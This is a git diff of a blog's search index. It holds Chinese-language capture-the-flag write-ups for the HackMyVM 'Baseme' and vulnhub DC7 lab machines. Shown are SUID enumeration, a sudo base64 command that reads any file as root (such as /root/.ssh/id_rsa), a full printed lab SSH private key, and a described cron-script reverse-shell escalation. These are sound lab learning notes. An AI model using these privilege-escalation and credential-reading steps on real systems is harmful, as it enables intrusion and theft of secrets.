+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">lucas<span class="variable">@baseme</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
+<p>没有可以利用的  在查看用户有没有sudo权限<br><img src="https://pic1.imgdb.cn/item/679a3c2bd0e0a243d4f879d3.png"><br>发现可以执行base64<br>提权方式：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">base64</span> <span class="string">&quot;<span class="variable">$LFILE</span>&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure></div>
+<p>通过这种方式可以直接用root权限查想要的文件  也可以直接查root的ssh的rsa密钥  &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>-渗透 -HMV</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HMV-Connection</title>
     <url>/posts/10052.html</url>
     <content><![CDATA[<p>HMV-Connection靶场复盘</p>
@@ -208,27 +255,6 @@
       </categories>
       <tags>
         <tag>-渗透 -HMV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC7靶场复盘</title>
-    <url>/posts/51728.html</url>
-    <content><![CDATA[<p>vulnhub-DC7靶场复盘</p>
-<span id="more"></span>
-<p>最难的是最开始的信息收集 ！！！ 根据网站提示的到外部找信息 一下下面的D7user 去github找到<mark>敏感信息泄漏</mark></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -A扫描之后发现80端口下面的目录结构 并且看到http是用Drupal 这个软件支持的 （后面回用到</p>
-<h2 id="web-探测-信息收集"><a href="#web-探测-信息收集" class="headerlink" title="web 探测 + 信息收集"></a>web 探测 + 信息收集</h2><p>用dirsearch跑一下目录 也没有发现什么有用的网页<br>页面上有一个搜索框 用sqlmap尝试发现没有注入点<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>网站首页提示了用目录爆破不会成功 去外面找信息 –&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>在github成功找到了这个用户<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>在config.php 中找到了用户名和密码 尝试在网站登录  失败  我们就登录ssh  拿到shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
-<p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -320,32 +346,6 @@
 <h4 id="7-sh"><a href="#7-sh" class="headerlink" title="7. sh"></a>7. <code>sh</code></h4><ul>
 <li><code>sh</code> 是在容器中执行的命令，它启动一个 shell（即 <code>sh</code>），允许你在容器内与宿主机的根文件系统交互。</li>
 </ul>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>-渗透 -HMV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Baseme</title>
-    <url>/posts/46022.html</url>
-    <content><![CDATA[<p>HMV-Baseme靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f9d0e0a243d4f878d0.png"></p>
-<h1 id="Baseme"><a href="#Baseme" class="headerlink" title="Baseme"></a>Baseme</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3980d0e0a243d4f87970.png" alt="|500"><br>开放了22端口和80端口</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>web给了一行base64加密过的文本  得到一个用户名 lucas<br><img src="https://pic1.imgdb.cn/item/679a3983d0e0a243d4f87971.png" alt="|425"><br>提示这个靶机全部用的是base64<br><img src="https://pic1.imgdb.cn/item/679a3985d0e0a243d4f87972.png" alt="|350"><br>还给了一些密码字典  我们存储并且进行base64</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cat</span> pass);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> | <span class="built_in">base64</span> &gt;&gt; pass.txt;<span class="keyword">done</span> </span><br><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="built_in">cat</span> pass.txt     </span><br><span class="line">aWxvdmV5b3UK</span><br><span class="line">eW91bG92ZXlvdQo=</span><br><span class="line">c2hlbG92ZXN5b3UK</span><br><span class="line">aGVsb3Zlc3lvdQo=</span><br><span class="line">d2Vsb3ZleW91Cg==</span><br><span class="line">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure></div>
-<p>然后再进行目录爆破<br>用gobuster midium字典爆破之后还是没有发现有用的目录   换dirb&#x2F;common.txt字典<br>还是没有找到任何有用的信息  这里的字典要再用base64进行编码然后爆破  找到了两个目录<br><img src="https://pic1.imgdb.cn/item/679a3989d0e0a243d4f87974.png"><br>curl访问得到一串base64编码  解密之后得到是rsa密钥 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line"><span class="number">07</span>jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL<span class="symbol">/ptLk26RBnh</span></span><br><span class="line"><span class="number">7</span>bHG1JjGlxOkO6m<span class="operator">+</span><span class="number">1</span>oFNLtNuD2QPl8sbZtEzX4S9nNZ<span class="symbol">/dpyRpMfmB73rN3yyIylevVDEyv</span></span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq<span class="operator">+</span>b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj<span class="symbol">/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span></span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM<span class="operator">+</span><span class="number">3</span>mzWjPdoBK<span class="symbol">/Ho339uPmBWI5sbMrpK</span></span><br><span class="line">xkZMnl<span class="operator">+</span>rcTbgz4swv8gNuKhUc7wTgtrNX<span class="operator">+</span>PNMdIALNpsxYLt<span class="symbol">/l56GK8R4J8fLIU5+MojRs</span></span><br><span class="line"><span class="operator">+</span><span class="number">1</span>NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp<span class="operator">+</span>YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4<span class="operator">+</span>dW7nZ</span><br><span class="line">zjf3p0M77b<span class="symbol">/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span></span><br><span class="line">IJh<span class="operator">+</span>I<span class="operator">+</span>Zv1egSMS<span class="symbol">/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span></span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5<span class="symbol">/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span></span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS<span class="operator">+</span><span class="symbol">/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span></span><br><span class="line"><span class="operator">+</span><span class="number">8</span>gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ<span class="symbol">/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span></span><br><span class="line">tSn7hr8hppT2tUSxDvC<span class="operator">+</span>USMmw<span class="symbol">/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span></span><br><span class="line">N7bw45FhBZCsHCAbV2<span class="operator">+</span>hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif<span class="symbol">/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span></span><br><span class="line">O<span class="operator">+</span>TowA10RATek6ZEIxh6SmtDG<span class="symbol">/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span></span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line"><span class="number">3</span><span class="symbol">/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span></span><br><span class="line">ND8ikgmQvF6hrwwJBrp<span class="symbol">/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span></span><br><span class="line">LdmmRXUS<span class="operator">/</span>DtO<span class="operator">+</span><span class="number">69</span><span class="operator">/</span>aidvxGAYob<span class="operator">+</span><span class="number">1</span>M<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
-<p>尝试使用ssh登录<br><img src="https://pic1.imgdb.cn/item/679a3988d0e0a243d4f87973.png"><br>发现不能直接登录 根据提示执行 <code> ssh-keygen -f &#39;/root/.ssh/known_hosts&#39; -R &#39;192.168.240.45&#39;</code><br>然后需要密码  用一开始得到的几个密码的base64编码进行尝试  发现用第一个就能登录<br><img src="https://pic1.imgdb.cn/item/679a3c2cd0e0a243d4f879d4.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>查找有没有suid提权</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">lucas<span class="variable">@baseme</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
-<p>没有可以利用的  在查看用户有没有sudo权限<br><img src="https://pic1.imgdb.cn/item/679a3c2bd0e0a243d4f879d3.png"><br>发现可以执行base64<br>提权方式：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">base64</span> <span class="string">&quot;<span class="variable">$LFILE</span>&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure></div>
-<p>通过这种方式可以直接用root权限查想要的文件  也可以直接查root的ssh的rsa密钥  &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
 ]]></content>
       <categories>
         <category>靶场</category>
